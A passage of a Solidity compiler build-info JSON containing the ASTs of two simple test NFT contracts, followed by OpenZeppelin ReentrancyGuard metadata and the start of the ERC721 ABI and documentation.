1"},"value":"1"},"src":"589:18:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"572:35:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3239,"nodeType":"ExpressionStatement","src":"572:35:13"}]},"functionSelector":"c2229fea","id":3241,"implemented":true,"kind":"function","modifiers":[],"name":"mintNft","nameLocation":"458:7:13","nodeType":"FunctionDefinition","parameters":{"id":3222,"nodeType":"ParameterList","parameters":[],"src":"465:2:13"},"returnParameters":{"id":3223,"nodeType":"ParameterList","parameters":[],"src":"475:0:13"},"scope":3268,"src":"449:165:13","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"baseFunctions":[258],"body":{"id":3258,"nodeType":"Block","src":"714:154:13","statements":[{"expression":{"arguments":[{"arguments":[{"id":3251,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3243,"src":"753:7:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3250,"name":"_exists","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":499,"src":"745:7:13","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_bool_$","typeString":"function (uint256) view returns (bool)"}},"id":3252,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"745:16:13","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"455243373231204d657461646174613a2055524920717565727920666f72206e6f6e6578697374656e7420746f6b656e","id":3253,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"775:50:13","typeDescriptions":{"typeIdentifier":"t_stringliteral_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a","typeString":"literal_string \"ERC721 Metadata: URI query for nonexistent token\""},"value":"ERC721 Metadata: URI query for nonexistent token"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a","typeString":"literal_string \"ERC721 Metadata: URI query for nonexistent token\""}],"id":3249,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"724:7:13","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":3254,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"724:111:13","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3255,"nodeType":"ExpressionStatement","src":"724:111:13"},{"expression":{"id":3256,"name":"TOKEN_URI","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3203,"src":"852:9:13","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"functionReturnParameters":3248,"id":3257,"nodeType":"Return","src":"845:16:13"}]},"functionSelector":"c87b56dd","id":3259,"implemented":true,"kind":"function","modifiers":[],"name":"tokenURI","nameLocation":"629:8:13","nodeType":"FunctionDefinition","overrides":{"id":3245,"nodeType":"OverrideSpecifier","overrides":[],"src":"681:8:13"},"parameters":{"id":3244,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3243,"mutability":"mutable","name":"tokenId","nameLocation":"655:7:13","nodeType":"VariableDeclaration","scope":3259,"src":"647:15:13","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3242,"name":"uint256","nodeType":"ElementaryTypeName","src":"647:7:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"637:31:13"},"returnParameters":{"id":3248,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3247,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3259,"src":"699:13:13","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":3246,"name":"string","nodeType":"ElementaryTypeName","src":"699:6:13","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"698:15:13"},"scope":3268,"src":"620:248:13","stateMutability":"view","virtual":false,"visibility":"public"},{"body":{"id":3266,"nodeType":"Block","src":"931:38:13","statements":[{"expression":{"id":3264,"name":"s_tokenCounter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3205,"src":"948:14:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3263,"id":3265,"nodeType":"Return","src":"941:21:13"}]},"functionSelector":"6e02007d","id":3267,"implemented":true,"kind":"function","modifiers":[],"name":"getTokenCounter","nameLocation":"883:15:13","nodeType":"FunctionDefinition","parameters":{"id":3260,"nodeType":"ParameterList","parameters":[],"src":"898:2:13"},"returnParameters":{"id":3263,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3262,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3267,"src":"922:7:13","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3261,"name":"uint256","nodeType":"ElementaryTypeName","src":"922:7:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"921:9:13"},"scope":3268,"src":"874:95:13","stateMutability":"view","virtual":false,"visibility":"public"}],"scope":3269,"src":"116:855:13","usedErrors":[]}],"src":"32:940:13"},"id":13},"contracts/test/BasicNftTwo.sol":{"ast":{"absolutePath":"contracts/test/BasicNftTwo.sol","exportedSymbols":{"Address":[1489],"BasicNftTwo":[3339],"Context":[1511],"ERC165":[1710],"ERC721":[998],"IERC165":[1722],"IERC721":[1114],"IERC721Metadata":[1159],"IERC721Receiver":[1132],"Math":[2587],"Strings":[1686]},"id":3340,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":3270,"literals":["solidity","^","0.8",".7"],"nodeType":"PragmaDirective","src":"32:23:14"},{"absolutePath":"@openzeppelin/contracts/token/ERC721/ERC721.sol","file":"@openzeppelin/contracts/token/ERC721/ERC721.sol","id":3271,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":3340,"sourceUnit":999,"src":"56:57:14","symbolAliases":[],"unitAlias":""},{"abstract":false,"baseContracts":[{"baseName":{"id":3272,"name":"ERC721","nodeType":"IdentifierPath","referencedDeclaration":998,"src":"139:6:14"},"id":3273,"nodeType":"InheritanceSpecifier","src":"139:6:14"}],"contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":3339,"linearizedBaseContracts":[3339,998,1159,1114,1710,1722,1511],"name":"BasicNftTwo","nameLocation":"124:11:14","nodeType":"ContractDefinition","nodes":[{"constant":true,"functionSelector":"78ce9035","id":3276,"mutability":"constant","name":"TOKEN_URI","nameLocation":"175:9:14","nodeType":"VariableDeclaration","scope":3339,"src":"152:98:14","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":3274,"name":"string","nodeType":"ElementaryTypeName","src":"152:6:14","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"value":{"hexValue":"697066733a2f2f516d6472796f4578706745515151674a506f727577474a795a6d7a3653715634465254583169373343543369586e","id":3275,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"195:55:14","typeDescriptions":{"typeIdentifier":"t_stringliteral_1f9d10a7a68ee21b364cf906b4451bf59630aaecd34535d6daf48252c8bf9e89","typeString":"literal_string \"ipfs://QmdryoExpgEQQQgJPoruwGJyZmz6SqV4FRTX1i73CT3iXn\""},"value":"ipfs://QmdryoExpgEQQQgJPoruwGJyZmz6SqV4FRTX1i73CT3iXn"},"visibility":"public"},{"constant":false,"id":3278,"mutability":"mutable","name":"s_tokenCounter","nameLocation":"272:14:14","nodeType":"VariableDeclaration","scope":3339,"src":"256:30:14","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3277,"name":"uint256","nodeType":"ElementaryTypeName","src":"256:7:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"private"},{"anonymous":false,"id":3282,"name":"DogMinted","nameLocation":"298:9:14","nodeType":"EventDefinition","parameters":{"id":3281,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3280,"indexed":true,"mutability":"mutable","name":"tokenId","nameLocation":"324:7:14","nodeType":"VariableDeclaration","scope":3282,"src":"308:23:14","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3279,"name":"uint256","nodeType":"ElementaryTypeName","src":"308:7:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"307:25:14"},"src":"292:41:14"},{"body":{"id":3293,"nodeType":"Block","src":"376:35:14","statements":[{"expression":{"id":3291,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3289,"name":"s_tokenCounter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3278,"src":"386:14:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"30","id":3290,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"403:1:14","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"386:18:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3292,"nodeType":"ExpressionStatement","src":"386:18:14"}]},"id":3294,"implemented":true,"kind":"constructor","modifiers":[{"arguments":[{"hexValue":"446f676965","id":3285,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"360:7:14","typeDescriptions":{"typeIdentifier":"t_stringliteral_e5d21699003d762b953d66adecbe4f97c4791cae2f281f96a4beb7efcb7bbcf6","typeString":"literal_string \"Dogie\""},"value":"Dogie"},{"hexValue":"444f47","id":3286,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"369:5:14","typeDescriptions":{"typeIdentifier":"t_stringliteral_b5b35d1f7dc7cf1448a70456de4980702e1fdae4e057d31003c0e1e4b3c4bde2","typeString":"literal_string \"DOG\""},"value":"DOG"}],"id":3287,"kind":"baseConstructorSpecifier","modifierName":{"id":3284,"name":"ERC721","nodeType":"IdentifierPath","referencedDeclaration":998,"src":"353:6:14"},"nodeType":"ModifierInvocation","src":"353:22:14"}],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":3283,"nodeType":"ParameterList","parameters":[],"src":"350:2:14"},"returnParameters":{"id":3288,"nodeType":"ParameterList","parameters":[],"src":"376:0:14"},"scope":3339,"src":"339:72:14","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":3313,"nodeType":"Block","src":"443:139:14","statements":[{"expression":{"arguments":[{"expression":{"id":3298,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"463:3:14","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":3299,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"463:10:14","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":3300,"name":"s_tokenCounter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3278,"src":"475:14:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3297,"name":"_safeMint","nodeType":"Identifier","overloadedDeclarations":[548,577],"referencedDeclaration":548,"src":"453:9:14","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,uint256)"}},"id":3301,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"453:37:14","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3302,"nodeType":"ExpressionStatement","src":"453:37:14"},{"eventCall":{"arguments":[{"id":3304,"name":"s_tokenCounter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3278,"src":"515:14:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3303,"name":"DogMinted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3282,"src":"505:9:14","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_uint256_$returns$__$","typeString":"function (uint256)"}},"id":3305,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"505:25:14","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3306,"nodeType":"EmitStatement","src":"500:30:14"},{"expression":{"id":3311,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3307,"name":"s_tokenCounter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3278,"src":"540:14:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3310,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3308,"name":"s_tokenCounter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3278,"src":"557:14:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":3309,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"574:1:14","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"557:18:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"540:35:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3312,"nodeType":"ExpressionStatement","src":"540:35:14"}]},"functionSelector":"c2229fea","id":3314,"implemented":true,"kind":"function","modifiers":[],"name":"mintNft","nameLocation":"426:7:14","nodeType":"FunctionDefinition","parameters":{"id":3295,"nodeType":"ParameterList","parameters":[],"src":"433:2:14"},"returnParameters":{"id":3296,"nodeType":"ParameterList","parameters":[],"src":"443:0:14"},"scope":3339,"src":"417:165:14","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"baseFunctions":[258],"body":{"id":3329,"nodeType":"Block","src":"682:128:14","statements":[{"expression":{"arguments":[{"arguments":[{"id":3324,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3316,"src":"721:7:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3323,"name":"_exists","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":499,"src":"713:7:14","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_bool_$","typeString":"function (uint256) view returns (bool)"}},"id":3325,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"713:16:14","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732314d65746164617461203a2055524920717565727920666f72206e6f6e6578697374656e7420746f6b656e","id":3326,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"743:50:14","typeDescriptions":{"typeIdentifier":"t_stringliteral_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b","typeString":"literal_string \"ERC721Metadata : URI query for nonexistent token\""},"value":"ERC721Metadata : URI query for nonexistent token"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b","typeString":"literal_string \"ERC721Metadata : URI query for nonexistent token\""}],"id":3322,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"692:7:14","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":3327,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"692:111:14","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3328,"nodeType":"ExpressionStatement","src":"692:111:14"}]},"functionSelector":"c87b56dd","id":3330,"implemented":true,"kind":"function","modifiers":[],"name":"tokenURI","nameLocation":"597:8:14","nodeType":"FunctionDefinition","overrides":{"id":3318,"nodeType":"OverrideSpecifier","overrides":[],"src":"649:8:14"},"parameters":{"id":3317,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3316,"mutability":"mutable","name":"tokenId","nameLocation":"623:7:14","nodeType":"VariableDeclaration","scope":3330,"src":"615:15:14","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3315,"name":"uint256","nodeType":"ElementaryTypeName","src":"615:7:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"605:31:14"},"returnParameters":{"id":3321,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3320,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3330,"src":"667:13:14","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":3319,"name":"string","nodeType":"ElementaryTypeName","src":"667:6:14","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"666:15:14"},"scope":3339,"src":"588:222:14","stateMutability":"view","virtual":false,"visibility":"public"},{"body":{"id":3337,"nodeType":"Block","src":"873:38:14","statements":[{"expression":{"id":3335,"name":"s_tokenCounter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3278,"src":"890:14:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3334,"id":3336,"nodeType":"Return","src":"883:21:14"}]},"functionSelector":"6e02007d","id":3338,"implemented":true,"kind":"function","modifiers":[],"name":"getTokenCounter","nameLocation":"825:15:14","nodeType":"FunctionDefinition","parameters":{"id":3331,"nodeType":"ParameterList","parameters":[],"src":"840:2:14"},"returnParameters":{"id":3334,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3333,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3338,"src":"864:7:14","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3332,"name":"uint256","nodeType":"ElementaryTypeName","src":"864:7:14","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"863:9:14"},"scope":3339,"src":"816:95:14","stateMutability":"view","virtual":false,"visibility":"public"}],"scope":3340,"src":"115:798:14","usedErrors":[]}],"src":"32:882:14"},"id":14}},"contracts":{"@openzeppelin/contracts/security/ReentrancyGuard.sol":{"ReentrancyGuard":{"abi":[],"devdoc":{"details":"Contract module that helps prevent reentrant calls to a function. Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier available, which can be applied to functions to make sure there are no nested (reentrant) calls to them. Note that because there is a single `nonReentrant` guard, functions marked as `nonReentrant` may not call one another. This can be worked around by making those functions `private`, and then adding `external` `nonReentrant` entry points to them. TIP: If you would like to learn more about reentrancy and alternative ways to protect against it, check out our blog post https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].","kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Contract module that helps prevent reentrant calls to a function. Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier available, which can be applied to functions to make sure there are no nested (reentrant) calls to them. Note that because there is a single `nonReentrant` guard, functions marked as `nonReentrant` may not call one another. This can be worked around by making those functions `private`, and then adding `external` `nonReentrant` entry points to them. TIP: If you would like to learn more about reentrancy and alternative ways to protect against it, check out our blog post https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/security/ReentrancyGuard.sol\":\"ReentrancyGuard\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/security/ReentrancyGuard.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Contract module that helps prevent reentrant calls to a function.\\n *\\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\\n * available, which can be applied to functions to make sure there are no nested\\n * (reentrant) calls to them.\\n *\\n * Note that because there is a single `nonReentrant` guard, functions marked as\\n * `nonReentrant` may not call one another. This can be worked around by making\\n * those functions `private`, and then adding `external` `nonReentrant` entry\\n * points to them.\\n *\\n * TIP: If you would like to learn more about reentrancy and alternative ways\\n * to protect against it, check out our blog post\\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\\n */\\nabstract contract ReentrancyGuard {\\n    // Booleans are more expensive than uint256 or any type that takes up a full\\n    // word because each write operation emits an extra SLOAD to first read the\\n    // slot's contents, replace the bits taken up by the boolean, and then write\\n    // back. This is the compiler's defense against contract upgrades and\\n    // pointer aliasing, and it cannot be disabled.\\n\\n    // The values being non-zero value makes deployment a bit more expensive,\\n    // but in exchange the refund on every call to nonReentrant will be lower in\\n    // amount. Since refunds are capped to a percentage of the total\\n    // transaction's gas, it is best to keep them low in cases like this one, to\\n    // increase the likelihood of the full refund coming into effect.\\n    uint256 private constant _NOT_ENTERED = 1;\\n    uint256 private constant _ENTERED = 2;\\n\\n    uint256 private _status;\\n\\n    constructor() {\\n        _status = _NOT_ENTERED;\\n    }\\n\\n    /**\\n     * @dev Prevents a contract from calling itself, directly or indirectly.\\n     * Calling a `nonReentrant` function from another `nonReentrant`\\n     * function is not supported. It is possible to prevent this from happening\\n     * by making the `nonReentrant` function external, and making it call a\\n     * `private` function that does the actual work.\\n     */\\n    modifier nonReentrant() {\\n        _nonReentrantBefore();\\n        _;\\n        _nonReentrantAfter();\\n    }\\n\\n    function _nonReentrantBefore() private {\\n        // On the first call to nonReentrant, _status will be _NOT_ENTERED\\n        require(_status != _ENTERED, \\\"ReentrancyGuard: reentrant call\\\");\\n\\n        // Any calls to nonReentrant after this point will fail\\n        _status = _ENTERED;\\n    }\\n\\n    function _nonReentrantAfter() private {\\n        // By storing the original value once again, a refund is triggered (see\\n        // https://eips.ethereum.org/EIPS/eip-2200)\\n        _status = _NOT_ENTERED;\\n    }\\n}\\n\",\"keccak256\":\"0x190dd6f8d592b7e4e930feb7f4313aeb8e1c4ad3154c27ce1cf6a512fc30d8cc\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":10,"contract":"@openzeppelin/contracts/security/ReentrancyGuard.sol:ReentrancyGuard","label":"_status","offset":0,"slot":"0","type":"t_uint256"}],"types":{"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/token/ERC721/ERC721.sol":{"ERC721":{"abi":[{"inputs":[{"internalType":"string","name":"name_","type":"string"},{"internalType":"string","name":"symbol_","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"details":"Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including the Metadata extension, but not including the Enumerable extension, which is available separately as {ERC721Enumerable}.","kind":"dev","methods":{"approve(address,uint256)":{"details":"See {IERC721-approve}."},"balanceOf(address)":{"details":"See {IERC721-balanceOf}."},"constructor":{"details":"Initializes the contract by setting a `name` and a `symbol` to the token collection."},"getApproved(uint256)":{"details":"See {IERC721-getApproved}."},"isApprovedForAll(address,address)":{"details":"See {IERC721-isApprovedForAll}."},"name()":{"details":"See {IERC721Metadata-name}."},"ownerOf(uint256)":{"details":"See {IERC721-ownerOf}."},"safeTransferFrom(address,address,uint256)":{"details":"See {IERC721-safeTransferFrom}."},"safeTransferFrom(address,address,uint256,bytes)":{"details":"See {IERC721-safeTransferFrom}."},"setApprovalForAll(address,bool)":{"details":"See {IERC721-setApprovalForAll}."},"supportsInterface(bytes4)":{"details":"See {IERC165-supportsInterface}."},"symbol()":{"details":"See {IERC721Metadata-symbol}."},"tokenURI(uint256)":{"details":"See {IERC721Metadata-tokenURI}."},"transferFrom(address,address,uint256)":{"details":"See 